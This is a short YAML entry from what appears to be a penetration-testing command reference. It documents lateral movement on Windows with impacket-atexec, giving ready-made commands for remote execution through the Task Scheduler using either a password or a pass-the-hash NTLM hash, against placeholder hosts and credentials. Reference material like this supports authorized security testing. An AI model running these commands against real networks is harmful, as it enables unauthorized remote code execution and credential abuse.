---
description: |
  Execute commands on remote Windows machines via the Task Scheduler.
  Alternative lateral movement method.

  Reference values:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: admin
    Password: password123
command: |
  # With password
  impacket-atexec test.local/admin:password123@10.10.10.1 "whoami"

  # With hash
  impacket-atexec test.local/admin@10.10.10.1 -hashes :aad3b435b51404eeaad3b435b51404ee "whoami"
phase:
  - Lateral_Movement
target_os:
  - Windows
services:
  - SMB
  - RPC
items:
  - Username
  - Password
  - Hash
techniques:
  - Pass-the-Hash_Ticket
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
